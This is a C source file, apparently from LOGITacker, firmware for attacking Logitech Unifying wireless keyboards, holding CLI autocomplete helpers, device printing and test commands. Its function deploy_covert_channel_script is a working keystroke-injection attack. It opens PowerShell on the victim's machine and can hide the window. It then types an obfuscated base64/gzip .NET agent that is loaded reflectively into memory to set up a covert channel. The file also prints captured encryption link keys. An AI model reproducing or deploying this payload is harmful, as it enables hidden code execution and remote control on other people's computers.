#include "fds.h"
#include "fds_internal_defs.h"
#include "nrf_fstorage.h"
#include "nrf_fstorage_nvmc.h"
#include "ctype.h"
#include "logitacker_tx_payload_provider.h"
#include "logitacker_tx_pay_provider_string_to_keys.h"
#include "logitacker_processor_passive_enum.h"
#include "logitacker_options.h"
#include "logitacker_keyboard_map.h"
#include "nrf_cli.h"
#include "nrf_log.h"
#include "sdk_common.h"
#include "logitacker.h"
#include "logitacker_devices.h"
#include "helper.h"
#include "logitacker_unifying.h"
#include "logitacker_flash.h"
#include "logitacker_processor_inject.h"
#include "logitacker_script_engine.h"
#include "logitacker_processor_covert_channel.h"

//#define CLI_TEST_COMMANDS

static void cmd_devices_remove_all(nrf_cli_t const * p_cli, size_t argc, char **argv);
static void cmd_script_press(nrf_cli_t const *p_cli, size_t argc, char **argv);

#define STORED_DEVICES_AUTOCOMPLETE_LIST_MAX_ENTRIES 60
static char m_stored_device_addr_str_list[STORED_DEVICES_AUTOCOMPLETE_LIST_MAX_ENTRIES][LOGITACKER_DEVICE_ADDR_STR_LEN];
static int m_stored_device_addr_str_list_len = 0;
static char m_device_addr_str_list[LOGITACKER_DEVICES_DEVICE_LIST_MAX_ENTRIES][LOGITACKER_DEVICE_ADDR_STR_LEN];
static int m_device_addr_str_list_len = 0;
static char m_device_addr_str_list_first_entry[] = "all\x00";

#define STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES 32
static char m_stored_script_names_str_list[STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES][LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN];
static int m_stored_script_names_str_list_len = 0;

void deploy_covert_channel_script(bool hide) {
    char * agentscript = "$b=\"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\";nal no New-Object -F;$m=no IO.MemoryStream;$a=no byte[] 1024;$gz=(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress));$n=0;do{$n=$gz.Read($a,0,$a.Length);$m.Write($a,0,$n)}while ($n -gt 0);[System.Reflection.Assembly]::Load($m.ToArray());[LogitackerClient.Runner]::Run()\n";
    //char * agentscript = "Get-Date\n";
    char chunk[129] = {0};

    logitacker_script_engine_flush_tasks();

    logitacker_script_engine_append_task_press_combo("GUI r");
    logitacker_script_engine_append_task_delay(500);
    logitacker_script_engine_append_task_type_string("powershell.exe\n");
    logitacker_script_engine_append_task_delay(2000);

    if (hide) {
        logitacker_script_engine_append_task_type_string("$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);");
        logitacker_script_engine_append_task_type_string("$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName(\"WindowsBase\")).GetType(\"MS.Win32.UnsafeNativeMethods\"))::SetWindowPos($hw,$i,0,0,100,100,16512)\n");
        logitacker_script_engine_append_task_delay(500);
    }

    while (strlen(agentscript) >= 128) {
        memcpy(chunk, agentscript, 128); //keep last byte 0x00
        logitacker_script_engine_append_task_type_string(chunk);
        agentscript += 128; //advance pointer
    }
    memset(chunk,0,129);
    memcpy(chunk, agentscript, strlen(agentscript)); //keep last byte 0x00
    logitacker_script_engine_append_task_type_string(chunk);
}


static void stored_devices_str_list_update() {
    m_stored_device_addr_str_list_len = 1;
    memcpy(&m_stored_device_addr_str_list[0], m_device_addr_str_list_first_entry, sizeof(m_device_addr_str_list_first_entry));

    fds_find_token_t ftok;
    fds_record_desc_t record_desc;
    fds_flash_record_t flash_record;
    memset(&ftok, 0x00, sizeof(fds_find_token_t));

    while(fds_record_find(LOGITACKER_FLASH_FILE_ID_DEVICES, LOGITACKER_FLASH_RECORD_KEY_DEVICES, &record_desc, &ftok) == NRF_SUCCESS &&
    m_stored_device_addr_str_list_len <= STORED_DEVICES_AUTOCOMPLETE_LIST_MAX_ENTRIES) {
        if (fds_record_open(&record_desc, &flash_record) != NRF_SUCCESS) {
            NRF_LOG_WARNING("Failed to open record");
            continue; // go on with next
        }

        logitacker_devices_unifying_device_t const * p_device = flash_record.p_data;
        helper_addr_to_hex_str(m_stored_device_addr_str_list[m_stored_device_addr_str_list_len], LOGITACKER_DEVICE_ADDR_LEN, p_device->rf_address);
        m_stored_device_addr_str_list_len++;


        if (fds_record_close(&record_desc) != NRF_SUCCESS) {
            NRF_LOG_WARNING("Failed to close record");
        }
    }

}

static void stored_script_names_str_list_update() {
    fds_find_token_t ftoken;
    memset(&ftoken, 0x00, sizeof(fds_find_token_t));
    fds_flash_record_t flash_record;
    fds_record_desc_t fds_record_desc;

    m_stored_script_names_str_list_len = 0;
    while(m_stored_script_names_str_list_len < STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES && fds_record_find(LOGITACKER_FLASH_FILE_ID_STORED_SCRIPTS_INFO, LOGITACKER_FLASH_RECORD_KEY_STORED_SCRIPTS_INFO, &fds_record_desc, &ftoken) == NRF_SUCCESS) {
        if (fds_record_open(&fds_record_desc, &flash_record) != NRF_SUCCESS) {
            NRF_LOG_WARNING("failed to open record");
            continue; // go on with next
        }

        stored_script_fds_info_t const * p_stored_tasks_fds_info_tmp = flash_record.p_data;

        int slen = strlen(p_stored_tasks_fds_info_tmp->script_name);
        slen = slen >= LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN ? LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN-1 : slen;
        memcpy(m_stored_script_names_str_list[m_stored_script_names_str_list_len], p_stored_tasks_fds_info_tmp->script_name, slen);

        if (fds_record_close(&fds_record_desc) != NRF_SUCCESS) {
            NRF_LOG_WARNING("failed to close record");
        }

        m_stored_script_names_str_list_len++;
    }
}

static void device_address_str_list_update() {
    m_device_addr_str_list_len = 1;
    memcpy(&m_device_addr_str_list[0], m_device_addr_str_list_first_entry, sizeof(m_device_addr_str_list_first_entry));

    logitacker_devices_list_iterator_t iter = {0};
    logitacker_devices_unifying_device_t * p_device;

    while (logitacker_devices_get_next_device(&p_device, &iter) == NRF_SUCCESS) {
        helper_addr_to_hex_str(m_device_addr_str_list[m_device_addr_str_list_len], LOGITACKER_DEVICE_ADDR_LEN, p_device->rf_address);
        m_device_addr_str_list_len++;
    }

}

// dynamic creation of stored script name list
static void dynamic_script_name(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";

    if (idx == 0) stored_script_names_str_list_update();

    //NRF_LOG_INFO("script list len %d", m_stored_script_names_str_list_len);

    if (idx >= m_stored_script_names_str_list_len) {
        p_static->p_syntax = NULL;
        return;
    }

    p_static->p_syntax = m_stored_script_names_str_list[idx];
}

static void dynamic_device_addr_list_ram_with_all(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";


    if (idx == 0) {
        device_address_str_list_update(); // update list if idx 0 is requested
        p_static->p_syntax = m_device_addr_str_list[0];
        p_static->handler = cmd_devices_remove_all;
        p_static->p_help = "remove all devices";
    } else if (idx < m_device_addr_str_list_len) {
        p_static->p_syntax = m_device_addr_str_list[idx];
    } else {
        p_static->p_syntax = NULL;
    }
}

static void dynamic_device_addr_list_ram_with_usb(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";


    if (idx == 0) {
        device_address_str_list_update(); // update list if idx 0 is requested
        memcpy(m_device_addr_str_list[0], "USB\x00", 4);
        p_static->p_syntax = m_device_addr_str_list[0];
    } else if (idx < m_device_addr_str_list_len) {
        p_static->p_syntax = m_device_addr_str_list[idx];
    } else {
        p_static->p_syntax = NULL;
    }
}

// dynamic creation of command addresses
static void dynamic_device_addr_list_ram(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";

    if (idx == 0) device_address_str_list_update();

    if (idx < m_device_addr_str_list_len-1) {
        p_static->p_syntax = m_device_addr_str_list[idx+1]; //ignore first entry
    } else {
        p_static->p_syntax = NULL;
    }
}
/*
// dynamic creation of command addresses
static void dynamic_device_addr_list_stored_with_all(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";


    if (idx == 0) {
        stored_devices_str_list_update(); // update list if idx 0 is requested
        p_static->p_syntax = m_device_addr_str_list[0];
        p_static->handler = NULL;
        p_static->p_help = "remove all devices";
    } else if (idx < m_stored_device_addr_str_list_len) {
        p_static->p_syntax = m_stored_device_addr_str_list[idx];
    } else {
        p_static->p_syntax = NULL;
    }
}
 */

// dynamic creation of command addresses
static void dynamic_device_addr_list_stored(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";

    if (idx == 0) stored_devices_str_list_update();

    if (idx < m_stored_device_addr_str_list_len-1) {
        p_static->p_syntax = m_stored_device_addr_str_list[idx+1]; //ignore first entry
    } else {
        p_static->p_syntax = NULL;
    }
}



static void print_logitacker_device_info(nrf_cli_t const * p_cli, const logitacker_devices_unifying_device_t * p_device) {
    if (p_device == NULL) {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "empty device pointer");
        return;
    }
    logitacker_devices_unifying_dongle_t * p_dongle = p_device->p_dongle;
    if (p_dongle == NULL) {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "empty dongle pointer");
        return;
    }

    char tmp_addr_str[16];
    helper_addr_to_hex_str(tmp_addr_str, LOGITACKER_DEVICE_ADDR_LEN, p_device->rf_address);

    // select print color based on device data
    bool dev_is_logitech = p_dongle->classification == DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING;
    nrf_cli_vt100_color_t outcol = NRF_CLI_VT100_COLOR_DEFAULT;
    if (dev_is_logitech) outcol = NRF_CLI_VT100_COLOR_BLUE;
    //if (p_device->vuln_forced_pairing) outcol = NRF_CLI_VT100_COLOR_YELLOW;
    if (p_device->vuln_plain_injection) outcol = NRF_CLI_VT100_COLOR_GREEN;
    if (p_device->key_known) outcol = NRF_CLI_VT100_COLOR_RED;

    /*
    nrf_cli_fprintf(p_cli, outcol, "%s %s, keyboard: %s (%s, %s), mouse: %s\r\n",
        nrf_log_push(tmp_addr_str),
        p_dongle->classification == DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING ? "Logitech device" : "unknown device",
        (p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD) > 0 ?  "yes" : "no",
        (p_device->caps & LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION) > 0 ?  "encrypted" : "not encrypted",
        p_device->key_known ?  "key ḱnown" : "key unknown",
        (p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_MOUSE) > 0 ?  "yes" : "no"
        );
    */

    nrf_cli_fprintf(p_cli, outcol, "%s", tmp_addr_str);
    nrf_cli_fprintf(p_cli, outcol, " '%s'", strlen(p_device->device_name) == 0 ? "unknown name" : p_device->device_name);

    nrf_cli_fprintf(p_cli, outcol, " keyboard: ");
    if ((p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD) > 0) {
        nrf_cli_fprintf(p_cli, outcol, "%s", (p_device->caps & LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION) > 0 ? "encrypted" : "unencrypted");
    } else {
        nrf_cli_fprintf(p_cli, outcol, "no");
    }

    nrf_cli_fprintf(p_cli, outcol, " mouse: %s", (p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_MOUSE) > 0 ? "yes" : "no");
    nrf_cli_fprintf(p_cli, outcol, "\r\n");

    nrf_cli_fprintf(p_cli, outcol, "\tclass: ");
    switch (p_dongle->classification) {
        case DONGLE_CLASSIFICATION_IS_LOGITECH_G700:
            nrf_cli_fprintf(p_cli, outcol, "Logitech G700/G700s");
            break;
        case DONGLE_CLASSIFICATION_IS_LOGITECH_LIGHTSPEED:
            nrf_cli_fprintf(p_cli, outcol, "Logitech LIGHTSPEED");
            break;
        case DONGLE_CLASSIFICATION_UNKNOWN:
            nrf_cli_fprintf(p_cli, outcol, "Unknown");
            break;
        case DONGLE_CLASSIFICATION_IS_NOT_LOGITECH:
            nrf_cli_fprintf(p_cli, outcol, "Not Logitech");
            break;
        case DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING:
            nrf_cli_fprintf(p_cli, outcol, "Logitech Unifying compatible");
            break;
    }
    nrf_cli_fprintf(p_cli, outcol, " device WPID: 0x%.2x%.2x", p_device->wpid[0], p_device->wpid[1]);
    nrf_cli_fprintf(p_cli, outcol, " dongle WPID: 0x%.2x%.2x", p_dongle->wpid[0], p_dongle->wpid[1]);
    if (p_dongle->is_nordic) nrf_cli_fprintf(p_cli, outcol, " (Nordic)");
    if (p_dongle->is_texas_instruments) nrf_cli_fprintf(p_cli, outcol, " (Texas Instruments)");
    nrf_cli_fprintf(p_cli, outcol, "\r\n");

    if (p_device->key_known) {
        nrf_cli_fprintf(p_cli, outcol, "\tlink key: ");
        for (int i=0; i<16; i++) nrf_cli_fprintf(p_cli, outcol, "%.02x", p_device->key[i]);
        nrf_cli_fprintf(p_cli, outcol, "\r\n");
    }


}

#ifdef CLI_TEST_COMMANDS

static void cmd_testled(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1) {
        int count;
        if (sscanf(argv[1], "%d", &count) != 1) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, auto inject count has to be a integer number, but '%s' was given\r\n", argv[1]);
        } else {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "Toggle LED %d\r\n", count);
            switch (count) {
                case 0:
                    bsp_board_led_invert(BSP_BOARD_LED_0);
                    break;
                case 1:
                    bsp_board_led_invert(BSP_BOARD_LED_1);
                    break;
                case 2:
                    bsp_board_led_invert(BSP_BOARD_LED_2);
                    break;
                case 3:
                    bsp_board_led_invert(BSP_BOARD_LED_3);
                    break;
            }
        }
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, testled arg has to be a integer number\r\n");
    }
}



static void cmd_test_a(nrf_cli_t const * p_cli, size_t argc, char **argv)
{

    fds_stat_t fds_stats;
    fds_stat(&fds_stats);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "CLIS STATS\r\n-------------------\r\n");
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "pages available: %d\r\n", fds_stats.pages_available);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "open records   : %d\r\n", fds_stats.open_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "valid records  : %d\r\n", fds_stats.valid_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "dirty records  : %d\r\n", fds_stats.dirty_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "words reserved : %d\r\n", fds_stats.words_reserved);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "words used     : %d\r\n", fds_stats.words_used);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "largest contig : %d\r\n", fds_stats.largest_contig);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "freeable words : %d\r\n", fds_stats.freeable_words);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "corruption     : %s\r\n", fds_stats.corruption ? "true" : "false");

    //fds_gc();
}


static void cmd_test_b(nrf_cli_t const * p_cli, size_t argc, char **argv) {
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "usb report received  : %d\r\n", g_logitacker_global_runtime_state.usb_led_out_report_count);
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "usb script triggered: %s\r\n", g_logitacker_global_runtime_state.usb_inject_script_triggered ? "true" : "false");
        deploy_covert_channel_script(true);
}

static void cmd_test_c(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    fds_find_token_t ft;
    memset(&ft, 0x00, sizeof(fds_find_token_t));
    fds_record_desc_t rd;


    fds_flash_record_t flash_record;

    char * tmp_str[256] = {0};

